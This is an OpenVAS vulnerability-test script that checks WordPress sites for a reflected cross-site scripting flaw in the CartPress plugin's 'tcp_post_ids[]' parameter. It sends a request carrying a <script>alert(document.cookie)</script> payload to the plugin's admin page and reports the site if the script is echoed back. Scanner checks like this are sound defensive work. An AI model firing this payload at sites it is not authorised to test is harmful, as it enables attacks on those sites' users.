###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_cartpress_plugin_xss_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress CartPress Plugin 'tcp_post_ids' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802554");
  script_version("$Revision: 13962 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-17 11:02:19 +0200 (Mo, 17 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-01-04 13:54:24 +0530 (Wed, 04 Jan 2012)");
  script_name("WordPress CartPress Plugin 'tcp_post_ids' Parameter Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108272/wpcartpress-xss.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute
  arbitrary web script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress CartPress Plugin version 1.1.6 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an input validation error in the 'tcp_post_ids[]'
  parameter in '/wp-content/plugins/thecartpress/admin/OptionsPostsList.php'
  when processing user-supplied data.");

  script_tag(name:"solution", value:"Upgrade to WordPress CartPress Plugin 1.1.7 or higher.");

  script_tag(name:"summary", value:"This host is installed with WordPress CartPress plugin and is
  prone to cross-site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/thecartpress/download/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/thecartpress/admin/OptionsPostsList.php?tcp_options_posts_update=&tcp_post_ids[]=<script>alert(document.cookie);</script>';

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document\.cookie\);</script>", check_header:TRUE)){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);